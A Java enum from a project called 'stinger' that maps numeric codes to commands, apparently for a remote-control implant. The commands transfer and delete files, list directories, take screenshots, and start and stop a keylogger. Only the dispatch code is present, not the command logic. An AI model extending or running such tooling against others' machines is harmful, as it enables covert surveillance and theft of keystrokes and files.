package stinger.commands;

import stinger.commands.impl.DeletePathCommand;
import stinger.commands.impl.GetFileCommand;
import stinger.commands.impl.ListDirCommand;
import stinger.commands.impl.PutFileCommand;
import stinger.commands.impl.StartKeyloggerCommand;
import stinger.commands.impl.StopCommand;
import stinger.commands.impl.StopKeyloggerCommand;
import stinger.commands.impl.TakeScreenshotCommand;
import stingerlib.commands.CommandType;

public enum StandardCommandType implements CommandType {
    STOP(0) {
        @Override
        public Command createCommand() {
            return new StopCommand();
        }
    },
    PUT_FILE(1) {
        @Override
        public Command createCommand() {
            return new PutFileCommand();
        }
    },
    GET_FILE(2) {
        @Override
        public Command createCommand() {
            return new GetFileCommand();
        }
    },
    DELETE_PATH(3) {
        @Override
        public Command createCommand() {
            return new DeletePathCommand();
        }
    },
    LIST_DIR(4) {
        @Override
        public Command createCommand() {
            return new ListDirCommand();
        }
    },
    TAKE_SCREENSHOT(5) {
        @Override
        public Command createCommand() {
            return new TakeScreenshotCommand();
        }
    },
    START_KEYLOGGER(6) {
        @Override
        public Command createCommand() {
            return new StartKeyloggerCommand();
        }
    },
    STOP_KEYLOGGER(7) {
        @Override
        public Command createCommand() {
            return new StopKeyloggerCommand();
        }
    }
    ;

    private final int mIntValue;

    StandardCommandType(int intValue) {
        mIntValue = intValue;
    }

    @Override
    public int intValue() {
        return mIntValue;
    }

    public abstract Command createCommand();

    public static StandardCommandType fromInt(int value) {
        for (StandardCommandType type : values()) {
            if (type.intValue() == value) {
                return type;
            }
        }

        throw new EnumConstantNotPresentException(StandardCommandType.class,
                String.valueOf(value));
    }
}
